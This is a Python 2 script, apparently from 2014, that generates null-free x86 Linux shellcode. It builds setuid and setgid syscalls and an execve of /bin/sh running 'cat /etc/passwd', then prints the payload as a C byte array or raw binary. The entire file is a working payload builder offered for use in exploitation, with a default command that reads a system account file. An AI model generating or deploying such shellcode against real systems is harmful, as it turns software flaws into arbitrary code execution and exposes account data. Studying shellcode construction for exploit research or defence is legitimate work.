from struct import pack
import sys 
import binascii

##########################################################
#
#   exec binfile  with paramters if given
#
#	                         random	     2014-04-21
##########################################################


##########################################################
des_format = 'shellcode: exec %s %s' 
ALIGN = 4
BIN_FILE = '/bin/sh'
PARAMETERS = ['-c','cat /etc/passwd']
UID = 1008
GID = 1002
##########################################################

def out_format(language):
	if language=='c':
		des = '\n\n/*\n*  '+ des_format +'\n*/'
	elif language=='python':
		des = '\n\n#  '+ des_format +'  #'
	elif language=='perl':
		des = '\n\n#  '+ des_format +'  #'
	else:
		return 
	print des % (BIN_FILE,PARAMETERS)


#padding FilePath with  '/'  by 4 bytes aligned
def PaddingFilepath(binpath, align = ALIGN):
		newpath = ''
		sub_path =  binpath.split('/') 
		for p in sub_path:
			if len(p):
				newpath = newpath + (align - len(p) % align) * '/'  + p
		return newpath

def init_regs_shellcode():
	shellcode = ''
	#init
	shellcode += '\x31\xc0\x31\xd2\x31\xdb\x31\xc9'			#xor eax,eax#xor edx,edx#xor ebx,ebx#xor ecx,ecx
	return shellcode


def setuid_shellcode(userid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (userid <= 0):
		pass
	elif (userid <= 0xff):
		shellcode += '\xb3' + pack('B',userid)							#mov bl,UID
	elif (userid > 0xff):
		if not (userid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',userid+1)			#mov bx,(UID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',userid)				#mov bx,(UID)
	shellcode += '\xb0\x17'													#mov ax,0x17
	shellcode += '\xcd\x80'													#int 0x80  -----> setuid(UID)
	return shellcode

def setgid_shellcode(groupid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (groupid <= 0):
		pass
	elif (groupid <= 0xff):
		shellcode += '\xb3' + pack('B',groupid)							#mov bl,GID
	elif (groupid > 0xff):
		if not (groupid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',groupid+1)			#mov bx,(GID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',groupid)				#mov bx,(GID)
	shellcode += '\xb0\x2E'													#mov ax,0x2E
	shellcode += '\xcd\x80'													#int 0x80  -----> setgid(GID)
	return shellcode

def exec_shellcode(binpath,parameters):

	if len(binpath) % ALIGN :
		binpath = PaddingFilepath(binpath)
	strlen = len(binpath)
	cnt = strlen / ALIGN
	shellcode = ''

	#call execve(binpath,[binpath,arg1,arg2,...],NULL)
	shellcode += '\x31\xc0'												#xor eax,eax
	shellcode += '\x31\xd2\x52'											#xor edx,edx#push edx  --->  null bytes
	#push binpath
	binpath = binpath[::-1]													#reverse str
	for i in xrange(cnt):
			#push binpath
			shellcode += '\x68'												#push opcode
			shellcode += binpath[i*ALIGN:(i+1)*ALIGN][::-1]	#reverse
	shellcode += '\x89\xe3'												#mov ebx,esp	 #ebx store  the first argv for execve		
	#build the second argv for execve
	shellcode += '\x52'														#push edx  ---> as null bytes
	cnt = len(parameters)	
	if cnt:
		shellcode += '\x83\xec'	 + pack('B',(cnt*4) + 4)		#sub esp,cnt*4
		shellcode += '\x89\xe1'											#mov ecx, esp	  ecx= esp  #ecx store  the second argv for execve	
		for i in xrange(cnt):
				p = parameters[i][::-1]
				l = len(p)
				c = l / 2
				r = l % 2
				shellcode += '\x52'											#push edx  ---> as null bytes 
				for j in xrange(c):
					shellcode += '\x66\xb8'								#mov ax
					shellcode += p[j*2:(j+1)*2][::-1]	
					shellcode += '\x66\x50'								#push ax
				if r:
					shellcode += '\x31\xc0'								#xor eax,eax
					shellcode += '\xb4' + p[l-1]							#mov ah,p[_len-1]
					shellcode += '\x66\x50'								#push ax
					shellcode += '\x44'										#inc esp
				shellcode += "\x89\xe0"									#mov eax,esp
				shellcode += '\x89\x41' + pack('B',((i+1)*4))		#mov [ecx+(i+1)*4],eax
		shellcode += '\x89\x19'											#mov [ecx],ebx
	else:
		shellcode += '\x53'													#push ebx 
		shellcode += '\x89\xe1'											#mov ecx, esp	  ecx= esp
	shellcode += '\x31\xc0'												#xor eax,eax
	shellcode += '\xb0\x0b'												#mov al,0x0b	# execve call num
	shellcode += '\xcd\x80'												#int 0x80
	#call exit()
	#shellcode += '\x31\xc0\x31\xdb\x40\xcd\x80'
	return shellcode


def getshellcode(language, shellcode):
	new_shellcode = ''
	if language == 'bin':
			new_shellcode = shellcode
			sys.stdout.write(new_shellcode)
	if language == 'c':
			sys.stdout.write("\nchar shellcode[] = \\\n\"")
			for i in xrange(len(shellcode)):
				tmp =  '\\'+ str(hex(ord(shellcode[i])))[1:]  
				new_shellcode += tmp
				sys.stdout.write(tmp)
				if   not (i+1) % 16 :
					sys.stdout.write("\"\n\"")
			sys.stdout.write("\";\n\n\n")
	if language == 'perl':
			pass
	if language == 'python':
			pass	


if __name__ == '__main__':

	#language = 'bin'
	language = 'c'
	shellcode = ''
	shellcode += init_regs_shellcode()
	shellcode += setuid_shellcode(UID)
	shellcode += exec_shellcode( binpath=BIN_FILE, parameters=PARAMETERS)
	out_format(language)
	getshellcode(language, shellcode)
	
